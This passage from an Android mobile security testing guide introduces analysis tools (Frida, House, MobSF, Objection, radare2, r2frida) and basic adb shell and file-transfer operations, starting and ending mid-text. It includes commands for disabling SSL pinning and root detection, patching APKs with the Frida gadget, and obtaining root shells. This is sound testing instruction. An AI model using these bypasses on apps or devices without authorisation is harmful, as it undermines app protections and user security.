\NormalTok{session }\OperatorTok{=}\NormalTok{ frida.get\_usb\_device().attach(}\StringTok{\textquotesingle{}com.android.chrome\textquotesingle{}}\NormalTok{)}

\CommentTok{\# 1. we want to store method names inside a list}
\NormalTok{android\_view\_methods }\OperatorTok{=}\NormalTok{ []}

\NormalTok{source }\OperatorTok{=} \StringTok{"""}
\StringTok{Java.perform(function () \{}
\StringTok{    var view = Java.use("android.view.View");}
\StringTok{    var methods = view.class.getMethods();}
\StringTok{    for(var i = 0; i < methods.length; i++) \{}
\StringTok{        send(methods[i].toString());}
\StringTok{    \}}
\StringTok{\});}
\StringTok{"""}

\NormalTok{script }\OperatorTok{=}\NormalTok{ session.create\_script(source)}

\CommentTok{\# 2. this is a callback function, only method names containing "Text" will be appended to the list}
\KeywordTok{def}\NormalTok{ on\_message(message, data):}
    \ControlFlowTok{if} \StringTok{"Text"} \KeywordTok{in}\NormalTok{ message[}\StringTok{\textquotesingle{}payload\textquotesingle{}}\NormalTok{]:}
\NormalTok{        android\_view\_methods.append(message[}\StringTok{\textquotesingle{}payload\textquotesingle{}}\NormalTok{])}

\CommentTok{\# 3. we tell the script to run our callback each time a message is received}
\NormalTok{script.on(}\StringTok{\textquotesingle{}message\textquotesingle{}}\NormalTok{, on\_message)}

\NormalTok{script.load()}

\CommentTok{\# 4. we do something with the collected data, in this case we just print it}
\ControlFlowTok{for}\NormalTok{ method }\KeywordTok{in}\NormalTok{ android\_view\_methods:}
    \BuiltInTok{print}\NormalTok{(method)}

\NormalTok{session.detach()}
\end{Highlighting}
\end{Shaded}

This effectively filters the methods and prints only the ones containing
the string ``Text'':

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ python3 frida\_python\_send.}\FunctionTok{py}
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canResolveTextAlignment}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canResolveTextDirection}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{void}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{setTextAlignment}\NormalTok{(}\DataTypeTok{int}\NormalTok{)}
\KeywordTok{public} \DataTypeTok{void}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{setTextDirection}\NormalTok{(}\DataTypeTok{int}\NormalTok{)}
\KeywordTok{public} \DataTypeTok{void}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{setTooltipText}\NormalTok{(java.}\FunctionTok{lang}\NormalTok{.}\FunctionTok{CharSequence}\NormalTok{)}
\NormalTok{...}
\end{Highlighting}
\end{Shaded}

In the end, it is up to you to decide where would you like to work with
the data. Sometimes it will be more convenient to do it from JavaScript
and in other cases Python will be the best choice. Of course you can
also send messages from Python to JavaScript by using
\texttt{script.post}. Refer to the Frida docs for more information about
\href{https://www.frida.re/docs/messages/\#sending-messages-from-a-target-process}{sending}
and
\href{https://www.frida.re/docs/messages/\#receiving-messages-in-a-target-process}{receiving}
messages.

\hypertarget{house}{%
\subparagraph{House}\label{house}}

\href{https://github.com/nccgroup/house}{House} is a runtime mobile
application analysis toolkit for Android apps, developed and maintained
by the NCC Group and is written in Python.

It's leveraging a running Frida server on a rooted device or the Frida
gadget in a repackaged Android app. The intention of House is to allow
an easy way of prototyping Frida scripts via its convenient web GUI.

The installation instructions and ``how-to guide'' of House can be found
in the \href{https://github.com/nccgroup/house}{Readme of the Github
repo}.

\hypertarget{magisk}{%
\subparagraph{Magisk}\label{magisk}}

\texttt{Magisk} (``Magic Mask'') is one way to root your Android device.
It's specialty lies in the way the modifications on the system are
performed. While other rooting tools alter the actual data on the system
partition, Magisk does not (which is called ``systemless''). This
enables a way to hide the modifications from root-sensitive applications
(e.g.~for banking or games) and allows using the official Android OTA
upgrades without the need to unroot the device beforehand.

You can get familiar with Magisk reading the official
\href{https://topjohnwu.github.io/Magisk/}{documentation on GitHub}. If
you don't have Magisk installed, you can find installation instructions
in \href{https://topjohnwu.github.io/Magisk/install.html}{the
documentation}. If you use an official Android version and plan to
upgrade it, Magisk provides a
\href{https://topjohnwu.github.io/Magisk/ota.html}{tutorial on GitHub}.

Learn more about \protect\hyperlink{rooting-with-magisk}{rooting your
device with Magisk}.

\hypertarget{mobsf}{%
\subparagraph{MobSF}\label{mobsf}}

\href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}
is an automated, all-in-one mobile application pentesting framework that
also supports Android APK files. The easiest way of getting MobSF
started is via Docker.

\begin{verbatim}
$ docker pull opensecurity/mobile-security-framework-mobsf
$ docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
\end{verbatim}

Or install and start it locally on your host computer by running:

\begin{verbatim}
# Setup
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
./setup.sh # For Linux and Mac
setup.bat # For Windows

# Installation process
./run.sh # For Linux and Mac
run.bat # For Windows
\end{verbatim}

Once you have MobSF up and running you can open it in your browser by
navigating to \url{http://127.0.0.1:8000}. Simply drag the APK you want
to analyze into the upload area and MobSF will start its job.

After MobSF is done with its analysis, you will receive a one-page
overview of all the tests that were executed. The page is split up into
multiple sections giving some first hints on the attack surface of the
application.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/942a2c3a332ff2a3c126cf220ad029722e4d7d8b.png}
\caption{MobSF for Android}
\end{figure}

The following is displayed:

\begin{itemize}
\tightlist
\item
  Basic information about the app and its binary file.
\item
  Some options to:

  \begin{itemize}
  \tightlist
  \item
    View the \texttt{AndroidManifest.xml} file.
  \item
    View the IPC components of the app.
  \end{itemize}
\item
  Signer certificate.
\item
  App permissions.
\item
  A security analysis showing known defects e.g.~if the app backups are
  enabled.
\item
  List of libraries used by the app binary and list of all files inside
  the unzipped APK.
\item
  Malware analysis that checks for malicious URLs.
\end{itemize}

Refer to
\href{https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation}{MobSF
documentation} for more details.

\hypertarget{objection}{%
\subparagraph{Objection}\label{objection}}

\href{https://github.com/sensepost/objection}{Objection} is a ``runtime
mobile exploration toolkit, powered by Frida''. Its main goal is to
allow security testing on non-rooted devices through an intuitive
interface.

Objection achieves this goal by providing you with the tools to easily
inject the Frida gadget into an application by repackaging it. This way,
you can deploy the repackaged app to the non-rooted device by
sideloading it and interact with the application as explained in the
previous section.

However, Objection also provides a REPL that allows you to interact with
the application, giving you the ability to perform any action that the
application can perform. A full list of the features of Objection can be
found on the project's homepage, but here are a few interesting ones:

\begin{itemize}
\tightlist
\item
  Repackage applications to include the Frida gadget
\item
  Disable SSL pinning for popular methods
\item
  Access application storage to download or upload files
\item
  Execute custom Frida scripts
\item
  List the Activities, Services and Broadcast receivers
\item
  Start Activities
\end{itemize}

The ability to perform advanced dynamic analysis on non-rooted devices
is one of the features that makes Objection incredibly useful. An
application may contain advanced RASP controls which detect your rooting
method and injecting a frida-gadget may be the easiest way to bypass
those controls. Furthermore, the included Frida scripts make it very
easy to quickly analyze an application, or get around basic security
controls.

Finally, in case you do have access to a rooted device, Objection can
connect directly to the running Frida server to provide all its
functionality without needing to repackage the application.

Installing Objection

Objection can be installed through pip as described on
\href{https://github.com/sensepost/objection/wiki/Installation}{Objection's
Wiki}.

\begin{verbatim}
$ pip3 install objection
\end{verbatim}

If your device is jailbroken, you are now ready to interact with any
application running on the device and you can skip to the ``Using
Objection'' section below.

However, if you want to test on a non-rooted device, you will first need
to include the Frida gadget in the application. The
\href{https://github.com/sensepost/objection/wiki/Patching-Android-Applications}{Objection
Wiki} describes the needed steps in detail, but after making the right
preparations, you'll be able to patch an APK by calling the objection
command:

\begin{verbatim}
$ objection patchapk --source app-release.apk
\end{verbatim}

The patched application then needs to be installed using adb, as
explained in ``Basic Testing Operations - Installing Apps''.

Using Objection

Starting up Objection depends on whether you've patched the APK or
whether you are using a rooted device running Frida-server. For running
a patched APK, objection will automatically find any attached devices
and search for a listening Frida gadget. However, when using
frida-server, you need to explicitly tell frida-server which application
you want to analyze.

\begin{verbatim}
# Connecting to a patched APK
objection explore

# Find the correct name using frida-ps
$ frida-ps -Ua | grep -i telegram
30268  Telegram                               org.telegram.messenger

# Connecting to the Telegram app through Frida-server
$ objection --gadget="org.telegram.messenger" explore
\end{verbatim}

Once you are in the Objection REPL, you can execute any of the available
commands. Below is an overview of some of the most useful ones:

\begin{verbatim}
# Show the different storage locations belonging to the app
$ env

# Disable popular ssl pinning methods
$ android sslpinning disable

# List items in the keystore
$ android keystore list

# Try to circumvent root detection
$ android root disable
\end{verbatim}

More information on using the Objection REPL can be found on the
\href{https://github.com/sensepost/objection/wiki/Using-objection}{Objection
Wiki}

\hypertarget{radare2}{%
\subparagraph{radare2}\label{radare2}}

\href{https://rada.re/r/}{radare2} (r2) is a popular open source reverse
engineering framework for disassembling, debugging, patching and
analyzing binaries that is scriptable and supports many architectures
and file formats including Android and iOS apps. For Android, Dalvik DEX
(odex, multidex), ELF (executables, .so, ART) and Java (JNI and Java
classes) are supported. It also contains several useful scripts that can
help you during mobile application analysis as it offers low level
disassembling and safe static analysis that comes in handy when
traditional tools fail.

radare2 implements a rich command line interface (CLI) where you can
perform the mentioned tasks. However, if you're not really comfortable
using the CLI for reverse engineering you may want to consider using the
Web UI (via the \texttt{-H} flag) or the even more convenient Qt and C++
GUI version called \href{https://github.com/radareorg/cutter}{Cutter}.
Do keep in mind that the CLI, and more concretely its Visual Mode and
its scripting capabilities
(\href{https://github.com/radare/radare2-r2pipe}{r2pipe}), are the core
of radare2's power and it's definitely worth learning how to use it.

Installing radare2

Please refer to
\href{https://github.com/radare/radare2/blob/master/README.md}{radare2's
official installation instructions}. We highly recommend to always
install radare2 from the GitHub version instead of via common package
managers such as APT. Radare2 is in very active development, which means
that third party repositories are often outdated.

Using radare2

The radare2 framework comprises a set of small utilities that can be
used from the r2 shell or independently as CLI tools. These utilities
include \texttt{rabin2}, \texttt{rasm2}, \texttt{rahash2},
\texttt{radiff2}, \texttt{rafind2}, \texttt{ragg2}, \texttt{rarun2},
\texttt{rax2}, and of course \texttt{r2}, which is the main one.

For example, you can use \texttt{rafind2} to read strings directly from
an encoded Android Manifest (AndroidManifest.xml):

\begin{verbatim}
# Permissions
$ rafind2 -ZS permission AndroidManifest.xml
# Activities
$ rafind2 -ZS activity AndroidManifest.xml
# Content providers
$ rafind2 -ZS provider AndroidManifest.xml
# Services
$ rafind2 -ZS service AndroidManifest.xml
# Receivers
$ rafind2 -ZS receiver AndroidManifest.xml
\end{verbatim}

Or use \texttt{rabin2} to get information about a binary file:

\begin{verbatim}
$ rabin2 -I UnCrackable-Level1/classes.dex
arch     dalvik
baddr    0x0
binsz    5528
bintype  class
bits     32
canary   false
retguard false
class    035
crypto   false
endian   little
havecode true
laddr    0x0
lang     dalvik
linenum  false
lsyms    false
machine  Dalvik VM
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   false
sanitiz  false
static   true
stripped false
subsys   java
va       true
sha1  12-5508c  b7fafe72cb521450c4470043caa332da61d1bec7
adler32  12-5528c  00000000
\end{verbatim}

Type \texttt{rabin2\ -h} to see all options:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{rabin2}\NormalTok{ {-}h}
\ExtensionTok{Usage}\NormalTok{: rabin2 [{-}AcdeEghHiIjlLMqrRsSUvVxzZ] [{-}@ at] [{-}a arch] [{-}b bits] [{-}B addr]}
\NormalTok{              [}\ExtensionTok{{-}C}\NormalTok{ F:C:D] [{-}f str] [{-}m addr] [{-}n str] [{-}N m:M] [{-}P[{-}P] pdb]}
\NormalTok{              [}\ExtensionTok{{-}o}\NormalTok{ str] [{-}O str] [{-}k query] [{-}D lang symname] file}
 \ExtensionTok{{-}@}\NormalTok{ [addr]       show section, symbol or import at addr}
 \ExtensionTok{{-}A}\NormalTok{              list sub{-}binaries and their arch{-}bits pairs}
 \ExtensionTok{{-}a}\NormalTok{ [arch]       set arch (x86, arm, .. or }\OperatorTok{<}\NormalTok{arch}\OperatorTok{>}\NormalTok{\_}\OperatorTok{<}\NormalTok{bits}\OperatorTok{>}\NormalTok{)}
 \ExtensionTok{{-}b}\NormalTok{ [bits]       set bits (32, 64 ...)}
 \ExtensionTok{{-}B}\NormalTok{ [addr]       override base address (pie bins)}
 \ExtensionTok{{-}c}\NormalTok{              list classes}
 \ExtensionTok{{-}cc}\NormalTok{             list classes in header format}
 \ExtensionTok{{-}H}\NormalTok{              header fields}
 \ExtensionTok{{-}i}\NormalTok{              imports (symbols imported from libraries)}
 \ExtensionTok{{-}I}\NormalTok{              binary info}
 \ExtensionTok{{-}j}\NormalTok{              output in json}
 \ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

Use the main \texttt{r2} utility to access the \textbf{r2 shell}. You
can load DEX binaries just like any other binary:

\begin{verbatim}
$ r2 classes.dex
\end{verbatim}

Enter \texttt{r2\ -h} to see all available options. A very commonly used
flag is \texttt{-A}, which triggers an analysis after loading the target
binary. However, this should be used sparingly and with small binaries
as it is very time and resource consuming. You can learn more about this
in the chapter
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}''.

Once in the r2 shell, you can also access functions offered by the other
radare2 utilities. For example, running \texttt{i} will print the
information of the binary, exactly as \texttt{rabin2\ -I} does.

To print all the strings use \texttt{rabin2\ -Z} or the command
\texttt{iz} (or the less verbose \texttt{izq}) from the r2 shell.

\begin{verbatim}
[0x000009c8]> izq
0xc50 39 39 /dev/com.koushikdutta.superuser.daemon/
0xc79 25 25 /system/app/Superuser.apk
...
0xd23 44 44 5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=
0xd51 32 32 8d127684cbc37c17616d806cf50473cc
0xd76 6 6 <init>
0xd83 10 10 AES error:
0xd8f 20 20 AES/ECB/PKCS7Padding
0xda5 18 18 App is debuggable!
0xdc0 9 9 CodeCheck
0x11ac 7 7 Nope...
0x11bf 14 14 Root detected!
\end{verbatim}

Most of the time you can append special options to your commands such as
\texttt{q} to make the command less verbose (quiet) or \texttt{j} to
give the output in JSON format (use \texttt{\textasciitilde{}\{\}} to
prettify the JSON string).

\begin{verbatim}
[0x000009c8]> izj~{}
[
  {
    "vaddr": 3152,
    "paddr": 3152,
    "ordinal": 1,
    "size": 39,
    "length": 39,
    "section": "file",
    "type": "ascii",
    "string": "L2Rldi9jb20ua291c2hpa2R1dHRhLnN1cGVydXNlci5kYWVtb24v"
  },
  {
    "vaddr": 3193,
    "paddr": 3193,
    "ordinal": 2,
    "size": 25,
    "length": 25,
    "section": "file",
    "type": "ascii",
    "string": "L3N5c3RlbS9hcHAvU3VwZXJ1c2VyLmFwaw=="
  },
\end{verbatim}

You can print the class names and their methods with the r2 command
\texttt{ic} (\emph{information classes}).

\begin{verbatim}
[0x000009c8]> ic
...
0x0000073c [0x00000958 - 0x00000abc]    356 class 5 Lsg/vantagepoint/uncrackable1/MainActivity
                                                                            :: Landroid/app/Activity;
0x00000958 method 0 pC   Lsg/vantagepoint/uncrackable1/MainActivity.method.<init>()V
0x00000970 method 1 P    Lsg/vantagepoint/uncrackable1/MainActivity.method.a(Ljava/lang/String;)V
0x000009c8 method 2 r    Lsg/vantagepoint/uncrackable1/MainActivity.method.onCreate(Landroid/os/Bundle;)V
0x00000a38 method 3 p    Lsg/vantagepoint/uncrackable1/MainActivity.method.verify(Landroid/view/View;)V
0x0000075c [0x00000acc - 0x00000bb2]    230 class 6 Lsg/vantagepoint/uncrackable1/a :: Ljava/lang/Object;
0x00000acc method 0 sp   Lsg/vantagepoint/uncrackable1/a.method.a(Ljava/lang/String;)Z
0x00000b5c method 1 sp   Lsg/vantagepoint/uncrackable1/a.method.b(Ljava/lang/String;)[B
\end{verbatim}

You can print the imported methods with the r2 command \texttt{ii}
(\emph{information imports}).

\begin{verbatim}
[0x000009c8]> ii
[Imports]
Num  Vaddr       Bind      Type Name
...
  29 0x000005cc    NONE    FUNC Ljava/lang/StringBuilder.method.append(Ljava/lang/String;)Ljava/lang/StringBuilder;
  30 0x000005d4    NONE    FUNC Ljava/lang/StringBuilder.method.toString()Ljava/lang/String;
  31 0x000005dc    NONE    FUNC Ljava/lang/System.method.exit(I)V
  32 0x000005e4    NONE    FUNC Ljava/lang/System.method.getenv(Ljava/lang/String;)Ljava/lang/String;
  33 0x000005ec    NONE    FUNC Ljavax/crypto/Cipher.method.doFinal([B)[B
  34 0x000005f4    NONE    FUNC Ljavax/crypto/Cipher.method.getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
  35 0x000005fc    NONE    FUNC Ljavax/crypto/Cipher.method.init(ILjava/security/Key;)V
  36 0x00000604    NONE    FUNC Ljavax/crypto/spec/SecretKeySpec.method.<init>([BLjava/lang/String;)V
\end{verbatim}

A common approach when inspecting a binary is to search for something,
navigate to it and visualize it in order to interpret the code. One of
the ways to find something using radare2 is by filtering the output of
specific commands, i.e.~to grep them using \texttt{\textasciitilde{}}
plus a keyword (\texttt{\textasciitilde{}+} for case-insensitive). For
example, we might know that the app is verifying something, we can
inspect all radare2 flags and see where we find something related to
``verify''.

\begin{quote}
When loading a file, radare2 tags everything it's able to find. These
tagged names or references are called flags. You can access them via the
command \texttt{f}.
\end{quote}

In this case we will grep the flags using the keyword ``verify'':

\begin{verbatim}
[0x000009c8]> f~+verify
0x00000a38 132 sym.Lsg_vantagepoint_uncrackable1_MainActivity.method.verify_Landroid_view_View__V
0x00000a38 132 method.public.Lsg_vantagepoint_uncrackable1_MainActivity.Lsg_vantagepoint_uncrackable1
                                                        _MainActivity.method.verify_Landroid_view_View__V
0x00001400 6 str.verify
\end{verbatim}

It seems that we've found one method in 0x00000a38 (that was tagged two
times) and one string in 0x00001400. Let's navigate (seek) to that
method by using its flag:

\begin{verbatim}
[0x000009c8]> s sym.Lsg_vantagepoint_uncrackable1_MainActivity.method.verify_Landroid_view_View__V
\end{verbatim}

And of course you can also use the disassembler capabilities of r2 and
print the disassembly with the command \texttt{pd} (or \texttt{pdf} if
you know you're already located in a function).

\begin{verbatim}
[0x00000a38]> pd
\end{verbatim}

r2 commands normally accept options (see \texttt{pd?}), e.g.~you can
limit the opcodes displayed by appending a number (``N'') to the command
\texttt{pd\ N}.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/ff8101e999d5401645a7e1396652c25dd93ab67e.png}
\caption{Images/Chapters/0x05b/r2\_pd\_10.png}
\end{figure}

Instead of just printing the disassembly to the console you may want to
enter the so-called \textbf{Visual Mode} by typing \texttt{V}.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/1d1be24e834cab37f189d60c9d349789b2bdb0ae.png}
\caption{Images/Chapters/0x05b/r2\_visualmode\_hex.png}
\end{figure}

By default, you will see the hexadecimal view. By typing \texttt{p} you
can switch to different views, such as the disassembly view:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/853fd16c4f9112caf782ed394cb3bbc36b10900e.png}
\caption{Images/Chapters/0x05b/r2\_visualmode\_disass.png}
\end{figure}

Radare2 offers a \textbf{Graph Mode} that is very useful to follow the
flow of the code. You can access it from the Visual Mode by typing
\texttt{V}:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/74c7cf937d32349f587ab60d3a77f769b2e7ba77.png}
\caption{Images/Chapters/0x05b/r2\_graphmode.png}
\end{figure}

This is only a selection of some radare2 commands to start getting some
basic information from Android binaries. Radare2 is very powerful and
has dozens of commands that you can find on the
\href{https://radare.gitbooks.io/radare2book/basic_commands/intro.html}{radare2
command documentation}. Radare2 will be used throughout the guide for
different purposes such as reversing code, debugging or performing
binary analysis. We will also use it in combination with other
frameworks, especially Frida (see the r2frida section for more
information).

Please refer to the chapter
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' for more detailed use of radare2 on
Android, especially when analyzing native libraries. You may also want
to read the
\href{https://radare.gitbooks.io/radare2book/content/}{official radare2
book}.

\hypertarget{r2frida}{%
\subparagraph{r2frida}\label{r2frida}}

\href{https://github.com/nowsecure/r2frida}{r2frida} is a project that
allows radare2 to connect to Frida, effectively merging the powerful
reverse engineering capabilities of radare2 with the dynamic
instrumentation toolkit of Frida. R2frida allows you to:

\begin{itemize}
\tightlist
\item
  Attach radare2 to any local process or remote frida-server via USB or
  TCP.
\item
  Read/Write memory from the target process.
\item
  Load Frida information such as maps, symbols, imports, classes and
  methods into radare2.
\item
  Call r2 commands from Frida as it exposes the r2pipe interface into
  the Frida Javascript API.
\end{itemize}

Installing r2frida

Please refer to
\href{https://github.com/nowsecure/r2frida/blob/master/README.md\#installation}{r2frida's
official installation instructions}.

Using r2frida

With frida-server running, you should now be able to attach to it using
the pid, spawn path, host and port, or device-id. For example, to attach
to PID 1234:

\begin{verbatim}
$ r2 frida://1234
\end{verbatim}

For more examples on how to connect to frida-server,
\href{https://github.com/nowsecure/r2frida/blob/master/README.md\#usage}{see
the usage section in the r2frida's README page}.

Once attached, you should see the r2 prompt with the device-id. r2frida
commands must start with \texttt{\textbackslash{}} or \texttt{=!}. For
example, you may retrieve target information with the command
\texttt{\textbackslash{}i}:

\begin{verbatim}
[0x00000000]> \i
arch                x86
bits                64
os                  linux
pid                 2218
uid                 1000
objc                false
runtime             V8
java                false
cylang              false
pageSize            4096
pointerSize         8
codeSigningPolicy   optional
isDebuggerAttached  false
\end{verbatim}

To search in memory for a specific keyword, you may use the search
command \texttt{\textbackslash{}/}:

\begin{verbatim}
[0x00000000]> \/ unacceptable
Searching 12 bytes: 75 6e 61 63 63 65 70 74 61 62 6c 65
Searching 12 bytes in [0x0000561f05ebf000-0x0000561f05eca000]
...
Searching 12 bytes in [0xffffffffff600000-0xffffffffff601000]
hits: 23
0x561f072d89ee hit12_0 unacceptable policyunsupported md algorithmvar bad valuec
0x561f0732a91a hit12_1 unacceptableSearching 12 bytes: 75 6e 61 63 63 65 70 74 61
\end{verbatim}

To output the search results in JSON format, we simply add \texttt{j} to
our previous search command (just as we do in the r2 shell). This can be
used in most of the commands:

\begin{verbatim}
[0x00000000]> \/j unacceptable
Searching 12 bytes: 75 6e 61 63 63 65 70 74 61 62 6c 65
Searching 12 bytes in [0x0000561f05ebf000-0x0000561f05eca000]
...
Searching 12 bytes in [0xffffffffff600000-0xffffffffff601000]
hits: 23
{"address":"0x561f072c4223","size":12,"flag":"hit14_1","content":"unacceptable policyunsupported md algorithmvar bad valuec0"},{"address":"0x561f072c4275","size":12,"flag":"hit14_2","content":"unacceptableSearching 12 bytes: 75 6e 61 63 63 65 70 74 61"},{"address":"0x561f072c42c8","size":12,"flag":"hit14_3","content":"unacceptableSearching 12 bytes: 75 6e 61 63 63 65 70 74 61 "},
...
\end{verbatim}

To list the loaded libraries use the command \texttt{\textbackslash{}il}
and filter the results using the internal grep from radare2 with the
command \texttt{\textasciitilde{}}. For example, the following command
will list the loaded libraries matching the keywords \texttt{keystore},
\texttt{ssl} and \texttt{crypto}:

\begin{verbatim}
[0x00000000]> \il~keystore,ssl,crypto
0x00007f3357b8e000 libssl.so.1.1
0x00007f3357716000 libcrypto.so.1.1
\end{verbatim}

Similarly, to list the exports and filter the results by a specific
keyword:

\begin{verbatim}
[0x00000000]> \iE libssl.so.1.1~CIPHER
0x7f3357bb7ef0 f SSL_CIPHER_get_bits
0x7f3357bb8260 f SSL_CIPHER_find
0x7f3357bb82c0 f SSL_CIPHER_get_digest_nid
0x7f3357bb8380 f SSL_CIPHER_is_aead
0x7f3357bb8270 f SSL_CIPHER_get_cipher_nid
0x7f3357bb7ed0 f SSL_CIPHER_get_name
0x7f3357bb8340 f SSL_CIPHER_get_auth_nid
0x7f3357bb7930 f SSL_CIPHER_description
0x7f3357bb8300 f SSL_CIPHER_get_kx_nid
0x7f3357bb7ea0 f SSL_CIPHER_get_version
0x7f3357bb7f10 f SSL_CIPHER_get_id
\end{verbatim}

To list or set a breakpoint use the command db. This is useful when
analyzing/modifying memory:

\begin{verbatim}
[0x00000000]> \db
\end{verbatim}

Finally, remember that you can also run Frida JavaScript code with
\texttt{\textbackslash{}.} plus the name of the script:

\begin{verbatim}
[0x00000000]> \. agent.js
\end{verbatim}

You can find more examples on
\href{https://github.com/enovella/r2frida-wiki}{how to use r2frida} on
their Wiki project.

\hypertarget{basic-testing-operations}{%
\subsubsection{Basic Testing
Operations}\label{basic-testing-operations}}

\hypertarget{accessing-the-device-shell}{%
\paragraph{Accessing the Device
Shell}\label{accessing-the-device-shell}}

One of the most common things you do when testing an app is accessing
the device shell. In this section we'll see how to access the Android
shell both remotely from your host computer with/without a USB cable and
locally from the device itself.

\hypertarget{remote-shell}{%
\subparagraph{Remote Shell}\label{remote-shell}}

In order to connect to the shell of an Android device from your host
computer,
\href{https://developer.android.com/studio/command-line/adb}{adb} is
usually your tool of choice (unless you prefer to use remote SSH access,
e.g.~\href{https://wiki.termux.com/wiki/Remote_Access\#Using_the_SSH_server}{via
Termux}).

For this section we assume that you've properly enabled Developer Mode
and USB debugging as explained in ``Testing on a Real Device''. Once
you've connected your Android device via USB, you can access the remote
device's shell by running:

\begin{verbatim}
$ adb shell
\end{verbatim}

\begin{quote}
press Control + D or type \texttt{exit} to quit
\end{quote}

If your device is rooted or you're using the emulator, you can get root
access by running \texttt{su} once in the remote shell:

\begin{verbatim}
$ adb shell
bullhead:/ $ su
bullhead:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
\end{verbatim}

\begin{quote}
Only if you're working with an emulator you may alternatively restart
adb with root permissions with the command \texttt{adb\ root} so next
time you enter \texttt{adb\ shell} you'll have root access already. This
also allows to transfer data bidirectionally between your workstation
and the Android file system, even with access to locations where only
the root user has access to (via \texttt{adb\ push/pull}). See more
about data transfer in section
``\protect\hyperlink{host-device-data-transfer}{Host-Device Data
Transfer}'' below.
\end{quote}

Connect to Multiple Devices

If you have more than one device, remember to include the \texttt{-s}
flag followed by the device serial ID on all your \texttt{adb} commands
(e.g.~\texttt{adb\ -s\ emulator-5554\ shell} or
\texttt{adb\ -s\ 00b604081540b7c6\ shell}). You can get a list of all
connected devices and their serial IDs by using the following command:

\begin{verbatim}
$ adb devices
List of devices attached
00c907098530a82c    device
emulator-5554    device
\end{verbatim}

Connect to a Device over Wi-Fi

You can also access your Android device without using the USB cable. For
this you'll have to connect both your host computer and your Android
device to the same Wi-Fi network and follow the next steps:

\begin{itemize}
\tightlist
\item
  Connect the device to the host computer with a USB cable and set the
  target device to listen for a TCP/IP connection on port 5555:
  \texttt{adb\ tcpip\ 5555}.
\item
  Disconnect the USB cable from the target device and run
  \texttt{adb\ connect\ \textless{}device\_ip\_address\textgreater{}}.
  Check that the device is now available by running
  \texttt{adb\ devices}.
\item
  Open the shell with \texttt{adb\ shell}.
\end{itemize}

However, notice that by doing this you leave your device open to anyone
being in the same network and knowing the IP address of your device. You
may rather prefer using the USB connection.

\begin{quote}
For example, on a Nexus device, you can find the IP address at
\textbf{Settings} -\textgreater{} \textbf{System} -\textgreater{}
\textbf{About phone} -\textgreater{} \textbf{Status} -\textgreater{}
\textbf{IP address} or by going to the \textbf{Wi-Fi} menu and tapping
once on the network you're connected to.
\end{quote}

See the full instructions and considerations in the
\href{https://developer.android.com/studio/command-line/adb\#wireless}{Android
Developers Documentation}.

Connect to a Device via SSH

If you prefer, you can also enable SSH access. A convenient option is to
use Termux, which you can easily
\href{https://wiki.termux.com/wiki/Remote_Access\#Using_the_SSH_server}{configure
to offer SSH access} (with password or public key authentication) and
start it with the command \texttt{sshd} (starts by default on port
8022). In order to connect to the Termux via SSH you can simply run the
command \texttt{ssh\ -p\ 8022\ \textless{}ip\_address\textgreater{}}
(where \texttt{ip\_address} is the actual remote device IP). This option
has some additional benefits as it allows to access the file system via
SFTP also on port 8022.

\hypertarget{on-device-shell-app}{%
\subparagraph{On-device Shell App}\label{on-device-shell-app}}

While usually using an on-device shell (terminal emulator) might be very
tedious compared to a remote shell, it can prove handy for debugging in
case of, for example, network issues or check some configuration.

Termux is a terminal emulator for Android that provides a Linux
environment that works directly with or without rooting and with no
setup required. The installation of additional packages is a trivial
task thanks to its own APT package manager (which makes a difference in
comparison to other terminal emulator apps). You can search for specific
packages by using the command
\texttt{pkg\ search\ \textless{}pkg\_name\textgreater{}} and install
packages with \texttt{pkg\ install\ \textless{}pkg\_name\textgreater{}}.
You can install Termux straight from
\href{https://play.google.com/store/apps/details?id=com.termux}{Google
Play}.

\hypertarget{host-device-data-transfer}{%
\paragraph{Host-Device Data Transfer}\label{host-device-data-transfer}}

\hypertarget{using-adb}{%
\subparagraph{Using adb}\label{using-adb}}

You can copy files to and from a device by using the commands
\texttt{adb\ pull\ \textless{}remote\textgreater{}\ \textless{}local\textgreater{}}
and
\texttt{adb\ push\ \textless{}local\textgreater{}\ \textless{}remote\textgreater{}}
\href{https://developer.android.com/studio/command-line/adb\#copyfiles}{commands}.
Their usage is very straightforward. For example, the following will
copy \texttt{foo.txt} from your current directory (local) to the
\texttt{sdcard} folder (remote):

\begin{verbatim}
$ adb push foo.txt /sdcard/foo.txt
\end{verbatim}

This approach is commonly used when you know exactly what you want to
